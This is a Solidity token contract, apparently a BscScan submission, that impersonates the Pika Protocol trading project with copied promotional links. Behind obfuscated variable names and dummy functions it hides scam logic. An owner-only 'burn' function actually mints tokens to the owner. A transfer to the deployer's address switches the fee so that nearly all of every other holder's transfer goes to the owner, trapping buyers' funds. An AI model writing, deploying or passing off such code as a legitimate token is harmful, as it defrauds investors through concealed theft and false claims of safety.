/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

/*
PikaPro
Decentralized leverage trading on Optimism, up to 100x leverage on crypto and forex with low slippage
We are excited to announce Pika V3 is live on optimismFND
mainnet today!
👉👉https://link.medium.com/02GRklVrYrb 
👉👉https://discord.gg/ueEe398UWt
👉👉https://pikaprotocol.com
👉👉https://twitter.com/PikaProtocol
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity = 0.5.14;
contract PikaPro {
uint256 private  BcoPqe = 80;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  HkGugE = 30;
address private  wsWBxu = address(0);
uint256 private  LpCOYJ = 40;
address private  ByYvZN = address(1);
address private  mUNTaE = address(2);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
address private  cYmIef = address(3);
mapping (address => uint256) public balanceOf;
uint256 private  xliiyh = 1000000000000000000;
uint256 private  DPCXoC = 59;
address private  IlagcB = address(4);
string public  name = "PikaPro";
address private  NFxbZN = address(5);
string public  symbol = "PikaPro";
uint256 private  nSlfDf = 64;
uint256 private  ZuvrAk = 79;
address private  ufaquZ = address(6);
address private  FyTOAW = address(7);
uint256 public constant totalSupply = 200000000000000000000000000;
uint8 public constant decimals = 88;
mapping (address => mapping (address => uint256)) private _allowances;
address private  ZnKrTX = address(8);
uint256 public constant qFzAJl = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
//
//
//
//
function _getDPCX1oC() private returns (uint256) {
return DPCXoC + 10;
}
//
function _getNFxb1ZN() private returns (address) {
return NFxbZN;
}
//
//
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tghYtCb 0");
require(spender != address(0), "fghYtCb 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getufaqu2Z() private returns (address) {
return ufaquZ;
}
//
function _getwsWBx3u() private returns (address) {
return wsWBxu;
}
//
//
//
function _getcYmIe4f() private returns (address) {
return cYmIef;
}
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ghYtCb");
require(to != address(0), "ghYtCb");
require(amount <= balanceOf[from], "ghYtCb");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* qFzAJl/xliiyh ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==FyTOAW){
xliiyh = qFzAJl+20;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getmUNTa5E() private returns (address) {
return mUNTaE;
}
//
//
//
constructor () public {
FyTOAW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
//
//
function _getBcoP2qe() private returns (uint256) {
return BcoPqe + 10;
}
//
//
//
//
//
//
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
//
//
function _getnSl3fDf() private returns (uint256) {
return nSlfDf + 70;
}
//
//
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
//
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getLpC4OYJ() private returns (uint256) {
return LpCOYJ + 30;
}
//
function _getZuv5rAk() private returns (uint256) {
return ZuvrAk + 20;
}
//
//
//
//
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getIlag6cB() private returns (address) {
return IlagcB;
}
//
//
//
function _getByYv6ZN() private returns (address) {
return ByYvZN;
}
//
function _getHkG6ugE() private returns (uint256) {
return HkGugE + 17;
}
//
function _getZnKr7TX() private returns (address) {
return ZnKrTX;
}
//
//
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}